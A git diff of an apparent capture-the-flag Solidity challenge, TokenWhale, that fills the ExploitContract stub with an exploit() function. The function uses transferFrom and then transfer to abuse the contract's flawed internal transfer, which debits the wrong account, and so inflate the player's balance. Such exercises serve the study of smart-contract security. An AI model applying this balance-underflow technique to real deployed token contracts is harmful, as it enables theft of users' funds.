@@ -1,6 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
-
+import "forge-std/console.sol";
 contract TokenWhale {
     address player;
 
@@ -55,7 +55,6 @@ contract TokenWhale {
         require(balanceOf[from] >= value);
         require(balanceOf[to] + value >= balanceOf[to]);
         require(allowance[from][msg.sender] >= value);
-
         allowance[from][msg.sender] -= value;
         _transfer(to, value);
     }
@@ -68,6 +67,10 @@ contract ExploitContract {
     constructor(TokenWhale _tokenWhale) {
         tokenWhale = _tokenWhale;
     }
-
+    
     // write your exploit functions below
+    function exploit() public {
+        tokenWhale.transferFrom(msg.sender, msg.sender, 1);
+        tokenWhale.transfer(msg.sender, 1_000_000);
+    }
 }
